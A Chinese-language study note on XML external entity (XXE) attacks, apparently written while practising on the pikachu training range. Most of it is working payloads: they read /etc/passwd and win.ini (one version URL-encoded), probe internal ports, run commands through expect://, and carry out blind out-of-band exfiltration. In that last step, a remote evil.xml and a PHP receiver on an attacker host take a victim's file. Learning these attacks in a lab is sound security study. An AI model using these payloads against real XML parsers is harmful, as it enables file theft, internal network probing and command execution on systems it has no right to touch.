# XXE attack

禁止外部解析xml === 无xxe attack漏洞 

现在已经不常见了.


XML必须要有一个root element，要定义数据实体，这种定义数据实体/类型的行为叫做DTD，DTD可以内部定义也可以引用外部实体。引用外部实体会造成XXE attack.

```
	<!DOCTYPE 根元素 SYSTEM "DTD文件路径">
或者
	<!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>
会造成xxe attack。
```


例：

pikachu靶场xxe部分：
![[Pasted image 20211209214513.png]]
输入测试payload：

```
<?xml version = "1.0"?> <!DOCTYPE ANY [ <!ENTITY f SYSTEM "file:///etc/passwd"> ]> <x>&f;</x>
```


解析xml entity： ```&``` 开头，``` ；```结尾。例如 ``` <x>&f;</x> ``` 就是解析f实体，f在``` <!ENTITY f SYSTEM "file:///etc/passwd"> ``` 定义了。

结果：
![[Pasted image 20211209214959.png]]


## xxe attack应用


### 读取敏感文件

例如payload： 
1. ``` <?xml version = "1.0"?> <!DOCTYPE ANY [ <!ENTITY f SYSTEM "file:///etc/passwd"> ]> <x>&f;</x> ```
2. 如果xml attack payload需要在地址栏输入，例如  <a>xxx.com/xxx/?xml=somexmlattackpayload </a> 这种情况下，需要对payload先进行url编码，再传入地址栏，否则payload的一些符号会被过滤。
```http://127.0.0.1/xxe.php?xml=<%3fxml version%3d"1.0"%3f><!DOCTYPE%20 a%20 [<!ENTITY b SYSTEM"file%3a%2f%2f%2fC%3a%2fWindows%2fwin.ini">]><c>%26b%3b<%2fc>```
还可以用php伪协议读取文件，具体看暗月pdf



### 看内网端口是否开启

payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "http://127.0.0.1:80">
]>
<abc>&test;</abc>
```

如果需要url编码，那就把payload编码。   看是否有response判断内网某端口是否开启



### 执行命令
若开启expect 扩展，可以利用xxe漏洞执行命令
payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "expect://whoami">
]>
<abc>&test;</abc>

```


### 无回显带外通信
payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///C:/1.txt">
<!ENTITY % remote SYSTEM "http://192.168.0.107/evil.xml">
%remote;
%all;
]>
<root>&send;</root>


```

远程服务器上的evil.xml 文件内容:


```xml

<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.0.107/1.php?file=%file;'>">


```

1.php:

```php
<?php file_put_contents("1.txt", $_GET['file']); ?>
```

读取受害机C盘```1.txt```文件，写入到远程服务器的```1.txt```中。